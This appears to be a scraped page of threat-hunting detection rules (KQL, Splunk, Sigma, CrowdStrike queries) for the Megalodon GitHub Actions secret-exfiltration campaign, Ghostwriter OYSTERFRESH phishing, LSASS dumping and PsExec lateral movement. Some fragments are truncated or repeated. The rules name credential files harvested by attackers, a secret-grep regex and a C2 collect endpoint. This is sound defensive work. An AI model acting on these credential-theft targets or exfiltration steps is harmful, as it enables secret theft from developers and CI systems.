// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2025-33073")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc
APPLICATION
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Vulnerabilities
    where Vulnerabilities.signature IN ("CVE-2025-33073")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`
| sort - severity
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Vulnerabilities
    where Vulnerabilities.signature IN ("CVE-2025-33073")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`
| sort - severity

title: PsExec / SMB Lateral Movement Tooling Execution
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d03
status: experimental
description: |
    PsExec, paexec, smbexec, csexec, remcom — admin-grade tooling that
    pivots over SMB. Pair with `wmic /node:` for the full cluster.
references:
    - https://attack.mitre.org/techniques/T1021/002/
    - https://attack.mitre.org/techniques/T1569/002/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1021.002
    - attack.t1569.002
    - attack.lateral-movement
    - attack.execution
logsource:
    category: process_creation
    product: windows
detection:
    selection_psexec:
        Image|endswith:
            - '\psexec.exe'
            - '\psexec64.exe'
            - '\psexesvc.exe'
            - '\paexec.exe'
            - '\csexec.exe'
            - '\remcom.exe'
            - '\smbexec.py'
    selection_wmic_remote:
        Image|endswith:
            - '\wmic.exe'
        CommandLine|contains:
            - '/node:'
    condition: selection_psexec or selection_wmic_remote
falsepositives:
    - Sysadmins running approved remote-management tooling — wrap with
      a known-admin-host watchlist
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
       OR (Processes.process_name="wmic.exe" AND Processes.process="*/node:*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
       OR (Processes.process_name="wmic.exe" AND Processes.process="*/node:*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
| tstats summariesonly=false count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

    where (Processes.process="*lsass*" OR Processes.process="*sekurlsa*"

    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("4a927d031919fd6bd88d3c8a917214b54bca00f8ddc80ecfe4d230663dda7465", "b4592cea69699b2c0737d4e19cff7dca17b5baf5a238cd6da950a37e9986f216", "710a9d2653c8bd3689e451778dab9daec0de4c4c75f900788ccf23ef254b122a", "57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517", "bdd5da81ac34d9faa2a5118d4ed8f492239734be02146cd24a0e34270a48a455") or SHA1 in~ ("4a927d031919fd6bd88d3c8a917214b54bca00f8ddc80ecfe4d230663dda7465", "b4592cea69699b2c0737d4e19cff7dca17b5baf5a238cd6da950a37e9986f216", "710a9d2653c8bd3689e451778dab9daec0de4c4c75f900788ccf23ef254b122a", "57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517", "bdd5da81ac34d9faa2a5118d4ed8f492239734be02146cd24a0e34270a48a455") or MD5 in~ ("4a927d031919fd6bd88d3c8a917214b54bca00f8ddc80ecfe4d230663dda7465", "b4592cea69699b2c0737d4e19cff7dca17b5baf5a238cd6da950a37e9986f216", "710a9d2653c8bd3689e451778dab9daec0de4c4c75f900788ccf23ef254b122a", "57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517", "bdd5da81ac34d9faa2a5118d4ed8f492239734be02146cd24a0e34270a48a455")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("4a927d031919fd6bd88d3c8a917214b54bca00f8ddc80ecfe4d230663dda7465", "b4592cea69699b2c0737d4e19cff7dca17b5baf5a238cd6da950a37e9986f216", "710a9d2653c8bd3689e451778dab9daec0de4c4c75f900788ccf23ef254b122a", "57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517", "bdd5da81ac34d9faa2a5118d4ed8f492239734be02146cd24a0e34270a48a455") or SHA1 in~ ("4a927d031919fd6bd88d3c8a917214b54bca00f8ddc80ecfe4d230663dda7465", "b4592cea69699b2c0737d4e19cff7dca17b5baf5a238cd6da950a37e9986f216", "710a9d2653c8bd3689e451778dab9daec0de4c4c75f900788ccf23ef254b122a", "57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517", "bdd5da81ac34d9faa2a5118d4ed8f492239734be02146cd24a0e34270a48a455") or MD5 in~ ("4a927d031919fd6bd88d3c8a917214b54bca00f8ddc80ecfe4d230663dda7465", "b4592cea69699b2c0737d4e19cff7dca17b5baf5a238cd6da950a37e9986f216", "710a9d2653c8bd3689e451778dab9daec0de4c4c75f900788ccf23ef254b122a", "57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517", "bdd5da81ac34d9faa2a5118d4ed8f492239734be02146cd24a0e34270a48a455")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["4a927d031919fd6bd88d3c8a917214b54bca00f8ddc80ecfe4d230663dda7465", "b4592cea69699b2c0737d4e19cff7dca17b5baf5a238cd6da950a37e9986f216", "710a9d2653c8bd3689e451778dab9daec0de4c4c75f900788ccf23ef254b122a", "57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517", "bdd5da81ac34d9faa2a5118d4ed8f492239734be02146cd24a0e34270a48a455"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Megalodon: Mass GitHub Actions Secret Exfiltration Across 5,500+ Public Repositories

StepSecurity
2026-05-22 11 use cases 3 techniques 5 kill-chain phases detected

A forged commit. A workflow file disguised as a routine CI optimization. Within 6 hours, 5,561 GitHub repositories were backdoored. Cloud credentials harvested. SSH keys stolen. OIDC tokens minted and exfiltrated before any runner finished. The attacker never touched your application code, only your pipeline. Most repositories had no idea it happened.

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Megalodon backdoor workflow file (SysDiag.yml / Optimize-Build.yml) written to .github/workflows/ · File hash IOCs — endpoint file/process match · Article-specific behavioural hunt — Megalodon: Mass GitHub Actions Secret Exfiltration Across 5,500+ Public Reposito
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Megalodon CI/CD exfil: outbound HTTPS to C2 216.126.225.129:8443 · Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Megalodon harvester: curl POST to C2 /collect endpoint on Linux runner · [LLM] Megalodon harvester: bash secret-grep across workspace (API_KEY|SECRET|TOKEN|PRIVATE_KEY|BEGIN RSA) · [LLM] Megalodon harvester: clustered read of ~/.ssh/id_*, ~/.kube/config, ~/.npmrc, ~/.docker/config.json in one session · OAuth consent / suspicious app grant
[LLM] Megalodon CI/CD exfil: outbound HTTPS to C2 216.126.225.129:8443 Command & Control High
Detects any host (corporate proxy, EDR-monitored endpoint, self-hosted GitHub Actions runner) initiating a connection to the Megalodon campaign C2 server. The IP/port pair is unique to this campaign and any hit is a near-certain compromise indicator across the org. Rationale: Anchors on the article-published C2 IP 216.126.225.129 — a single hard IOC that StepSecurity attributes directly to the Megalodon campaign. The IP/port combo is not associated with any legitimate service in the article and any internal egress is high-fidelity.
ATT&CKT1041 T1567 T1071.001

DeviceNetworkEvents

| where RemoteIP == "216.126.225.129"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl, Protocol
| order by Timestamp desc

  (CommonSecurityLog

   | where DestinationIP == "216.126.225.129"

  (ImNetworkSession

[LLM] Megalodon harvester: curl POST to C2 /collect endpoint on Linux runner Actions on Objectives High
Detects the runtime exfil step of the Megalodon payload — a curl invocation POSTing gzipped credential blob to https://216.126.225.129:8443/collect. Catches both self-hosted runners and any Linux/Windows host re-executing the decoded payload. Rationale: Pivots on the verbatim exfil command in the article — curl POST to https://216.126.225.129:8443/collect with --data-binary. Combining curl binary + IP + /collect path makes a near-zero-FP detection that catches the payload even if the decoded bash is split across multiple invocations.

| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp desc

[LLM] Megalodon harvester: bash secret-grep across workspace (API_KEY|SECRET|TOKEN|PRIVATE_KEY|BEGIN RSA) Actions on Objectives Medium
Detects the recursive secret-scrape step of the Megalodon payload — `grep -rE "(API_KEY|SECRET|TOKEN|PASSWORD|PRIVATE_KEY|BEGIN RSA)"` walking the CI checkout looking for hardcoded secrets. The literal token list is the article-published payload string. Rationale: All six tokens (API_KEY, SECRET, TOKEN, PASSWORD, PRIVATE_KEY, BEGIN RSA) appear verbatim in the published bash payload's grep regex. Requiring all six together discriminates Megalodon from generic secret-scanners (gitleaks/trufflehog use their own ruleset, not raw greps with this exact token list).

[LLM] Megalodon harvester: clustered read of ~/.ssh/id_*, ~/.kube/config, ~/.npmrc, ~/.docker/config.json in one session Actions on Objectives Medium
Detects the credential-collection fan-out pattern — a single process tree reading multiple distinct credential stores (SSH private key, kube config, npm token, Docker registry creds) within a one-minute window. Catches Megalodon even if the bash one-liner is split into separate cat invocations and the C2 IP is not yet contactable. Rationale: Anchors directly on the article's decoded payload (Code blocks 2 and 3) — the exact targets cat'd by the Megalodon harvester: /proc/1/environ, ~/.ssh/id_*, ~/.kube/config, ~/.npmrc, ~/.docker/config.json. Requiring ≥3 distinct targets from the same parent within 1 minute discriminates from any single legitimate dotfile-reading tool.
ATT&CKT1552.001 T1552.004 T1555
Data sourcesEndpoint.Processes
let LookbackDays = 7d;
let WindowMin = 1m;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where FileName =~ "cat" or FolderPath endswith "/cat"
| where ProcessCommandLine has_any ("/proc/1/environ","/.ssh/id_","/.kube/config","/.npmrc","/.docker/config.json")
| extend Target = case(
    ProcessCommandLine has "/proc/1/environ","pid1_env",
    ProcessCommandLine has "/.ssh/id_","ssh_key",
    ProcessCommandLine has "/.kube/config","kube",
    ProcessCommandLine has "/.npmrc","npm",
    ProcessCommandLine has "/.docker/config.json","docker",
    "")
| summarize
    DistinctTargets = dcount(Target),
    Targets = make_set(Target, 10),
    SampleCmds = make_set(ProcessCommandLine, 10),
    FirstSeen = min(Timestamp),
    LastSeen = max(Timestamp)
    by DeviceName, AccountName, InitiatingProcessId, InitiatingProcessFileName, InitiatingProcessCommandLine, bin(Timestamp, WindowMin)
| where DistinctTargets >= 3
| order by LastSeen desc
let LookbackDays = 7d;
let WindowMin = 1m;
ImProcessCreate
| where TimeGenerated > ago(LookbackDays)
| where ActingProcessName endswith "cat"
| where ActingProcessCommandLine has_any ("/proc/1/environ","/.ssh/id_","/.kube/config","/.npmrc","/.docker/config.json")
| extend Target = case(
    ActingProcessCommandLine has "/proc/1/environ","pid1_env",
    ActingProcessCommandLine has "/.ssh/id_","ssh_key",
    ActingProcessCommandLine has "/.kube/config","kube",
    ActingProcessCommandLine has "/.npmrc","npm",
    ActingProcessCommandLine has "/.docker/config.json","docker",
    "")
| summarize
    DistinctTargets = dcount(Target),
    Targets = make_set(Target, 10),
    SampleCmds = make_set(ActingProcessCommandLine, 10),
    FirstSeen = min(TimeGenerated),
    LastSeen = max(TimeGenerated)
    by DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, bin(TimeGenerated, WindowMin)
| where DistinctTargets >= 3
| order by LastSeen desc
source:linux.auditd @process.executable.path:*\/cat @process.command_line:(*\/proc\/1\/environ* OR *\/.ssh\/id_* OR *\/.kube\/config* OR *\/.npmrc* OR *\/.docker\/config.json*)
#event_simpleName=ProcessRollup2 ImageFileName=/\/cat$/i CommandLine=/(\/proc\/1\/environ|\/\.ssh\/id_|\/\.kube\/config|\/\.npmrc|\/\.docker\/config\.json)/
| case {
    CommandLine=/\/proc\/1\/environ/ | target := "pid1";
    CommandLine=/\/\.ssh\/id_/ | target := "ssh";
    CommandLine=/\/\.kube\/config/ | target := "kube";
    CommandLine=/\/\.npmrc/ | target := "npm";
    CommandLine=/\/\.docker\/config\.json/ | target := "docker";
  }
| groupBy([aid, ComputerName, UserName, ParentBaseFileName], function=[count(field=target, distinct=true, as=distinct_targets), collect([target])])
| distinct_targets >= 3

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("acac5a9854650c4ae2883c4740bf87d34120c038") or SHA1 in~ ("acac5a9854650c4ae2883c4740bf87d34120c038") or MD5 in~ ("acac5a9854650c4ae2883c4740bf87d34120c038")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("acac5a9854650c4ae2883c4740bf87d34120c038") or SHA1 in~ ("acac5a9854650c4ae2883c4740bf87d34120c038") or MD5 in~ ("acac5a9854650c4ae2883c4740bf87d34120c038")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["acac5a9854650c4ae2883c4740bf87d34120c038"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Ghostwriter OYSTERFRESH: wscript.exe executing .js from user Downloads/Temp/Roaming · Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process · Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha) · PowerShell encoded / obfuscated command · Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Ghostwriter OYSTERBLUES: wscript.exe writing large encrypted blob to HKCU registry
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Ghostwriter OYSTERBLUES C2: wscript.exe HTTP POST exfiltrating host recon to external IP · Beaconing — periodic outbound to small set of destinations
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement
[LLM] Ghostwriter OYSTERFRESH: wscript.exe executing .js from user Downloads/Temp/Roaming Delivery High
Hunts the OYSTERFRESH delivery chain CERT-UA attributes to UAC-0057 (Ghostwriter): victim opens PDF lure, clicks a Prometheus-themed link that downloads a ZIP; extracted .js is executed under wscript.exe from a user-writable path. Pairs the named binary with the unzip-from-Downloads behaviour to keep false positives bounded. Rationale: Uses three article-anchored signals: (1) wscript.exe as the JS runtime CERT-UA names; (2) a user-writable archive-extraction directory because the article specifies ZIP→JS unzip; (3) a parent set restricted to browsers/archivers/mail clients that would have produced the unpack. CERT-UA's mitigation guidance to 'restrict wscript.exe for standard user accounts' confirms this is the load-bearing execution primitive. Cross-checked against: • https://cert.gov.ua/article • https://attack.mitre.org/groups/G1086/
ATT&CKT1059.007 T1204.002 T1566.002
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName =~ "wscript.exe"
| where ProcessCommandLine has_any (@"\Downloads\", @"\AppData\Local\Temp\", @"\AppData\Roaming\")
| where ProcessCommandLine matches regex @"(?i)\.js[e]?(\s|$|""|')"
| where InitiatingProcessFileName in~ ("explorer.exe","7zg.exe","7zfm.exe","winrar.exe","rar.exe","msedge.exe","chrome.exe","firefox.exe","acrobat.exe","acrord32.exe","outlook.exe")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, FolderPath, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessName endswith "wscript.exe"
| where ActingProcessCommandLine has_any (@"\Downloads\", @"\Temp\", @"\Roaming\")
| where ActingProcessCommandLine matches regex @"(?i)\.js[e]?(\s|$|""|')"
| where ParentProcessName has_any ("explorer.exe","7zg.exe","7zfm.exe","winrar.exe","rar.exe","msedge.exe","chrome.exe","firefox.exe","acrobat.exe","acrord32.exe","outlook.exe")
| where ActorUsername !endswith "$"
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine, SHA256
title: WScript Executing JavaScript From User Downloads or Temp (Ghostwriter OYSTERFRESH)

description: Detects wscript.exe launched with a .js/.jse path inside Downloads, AppData\\Local\\Temp or AppData\\Roaming, with a browser/archiver/mail-client parent. Matches the OYSTERFRESH delivery chain CERT-UA attributes to Ghostwriter (UAC-0057) targeting Ukrainian government entities via Prometheus-themed phishing.

logsource:

detection:
  selection_img:
    Image|endswith: '\wscript.exe'
  selection_path:
    CommandLine|contains:
      - '\Downloads\'
      - '\AppData\Local\Temp\'
      - '\AppData\Roaming\'
  selection_ext:
    CommandLine|contains:
      - '.js'
      - '.jse'
  selection_parent:
    ParentImage|endswith:
      - '\explorer.exe'
      - '\7zG.exe'
      - '\7zFM.exe'
      - '\WinRAR.exe'
      - '\Rar.exe'
      - '\msedge.exe'
      - '\chrome.exe'
      - '\firefox.exe'
      - '\Acrobat.exe'
      - '\AcroRd32.exe'
      - '\outlook.exe'
  condition: all of selection_*
level: high
source:windows.sysmon @EventID:1 @Image:(*\\wscript.exe OR *\\WScript.exe OR *\\WSCRIPT.EXE) (@CommandLine:*\\Downloads\\* OR @CommandLine:*\\Temp\\* OR @CommandLine:*\\Roaming\\*) (@CommandLine:*.js* OR @CommandLine:*.jse*) @ParentImage:(*\\explorer.exe OR *\\Explorer.EXE OR *\\7zG.exe OR *\\7zFM.exe OR *\\WinRAR.exe OR *\\Rar.exe OR *\\msedge.exe OR *\\chrome.exe OR *\\firefox.exe OR *\\Acrobat.exe OR *\\AcroRd32.exe OR *\\OUTLOOK.EXE)
#event_simpleName=ProcessRollup2 ImageFileName=/\\wscript\.exe$/i
| regex("\\\\(Downloads|Temp|Roaming)\\\\", field=CommandLine, flags="i")
| regex("\\.js[e]?(\\s|$|\"|')", field=CommandLine, flags="i")
| ParentBaseFileName=/(explorer|7zg|7zfm|winrar|rar|msedge|chrome|firefox|acrobat|acrord32|outlook)\.exe$/i
| groupBy([aid, ComputerName, UserName, ParentBaseFileName, CommandLine], function=count())

Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name=wscript.exe AND (Processes.process="*\\Downloads\\*.js*" OR Processes.process="*\\Temp\\*.js*" OR Processes.process="*\\Roaming\\*.js*") AND Processes.parent_process_name IN ("explorer.exe","7zg.exe","7zFM.exe","WinRAR.exe","Rar.exe","msedge.exe","chrome.exe","firefox.exe","Acrobat.exe","AcroRd32.exe","outlook.exe") by Processes.dest Processes.user Processes.parent_process_name Processes.process Processes.process_path | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name=wscript.exe AND (Processes.process="*\\Downloads\\*.js*" OR Processes.process="*\\Temp\\*.js*" OR Processes.process="*\\Roaming\\*.js*") AND Processes.parent_process_name IN ("explorer.exe","7zg.exe","7zFM.exe","WinRAR.exe","Rar.exe","msedge.exe","chrome.exe","firefox.exe","Acrobat.exe","AcroRd32.exe","outlook.exe") by Processes.dest Processes.user Processes.parent_process_name Processes.process Processes.process_path | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
[LLM] Ghostwriter OYSTERBLUES: wscript.exe writing large encrypted blob to HKCU registry Installation High
Hunts the fileless storage step of OYSTERFRESH: after first execution, the stager writes the obfuscated/encrypted OYSTERBLUES payload into a HKCU registry value (rather than disk) so OYSTERSHUCK can later decode it. Pairs wscript.exe as the writing process with a HKCU\Software target and a payload-sized value (>4 KB) — neither alone is suspicious, the combination is. Rationale: Three article-derived constraints stack: wscript.exe (the named runtime), HKCU\Software (the article says the encrypted blob is written to the registry; HKCU\Software is the only writable hive for a standard user where this fits), and value length >4 KB (encrypted payload large enough to hold a Cobalt Strike loader cannot fit in a Run-key-sized string). Falcon left empty because the listed FDR schema reference only exposes AsepValueUpdate (autostart entries), and OYSTERBLUES does not necessarily land in an autostart key — the generic registry-value write event is outside the documented schema. Cross-checked against: • https://attack.mitre.org/techniques/T1027/011/ • https://attack.mitre.org/groups/G1086/
ATT&CKT1112 T1027.011 T1059.007
Data sourcesEndpoint.Registry
DeviceRegistryEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName =~ "wscript.exe"
| where ActionType in ("RegistryValueSet","RegistryKeyCreated")
| where RegistryKey has @"HKEY_CURRENT_USER\Software"
| extend ValueLen = strlen(tostring(RegistryValueData))
| where ValueLen > 4096
| where InitiatingProcessAccountName !endswith "$"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessCommandLine, RegistryKey, RegistryValueName, RegistryValueType, ValueLen
| order by Timestamp desc
ImRegistryEvent
| where TimeGenerated > ago(7d)
| where ActingProcessName endswith "wscript.exe"
| where RegistryKey has_any (@"HKEY_CURRENT_USER\Software", @"HKCU\Software")
| extend ValueLen = strlen(tostring(RegistryValueData))
| where ValueLen > 4096
| where ActorUsername !endswith "$"
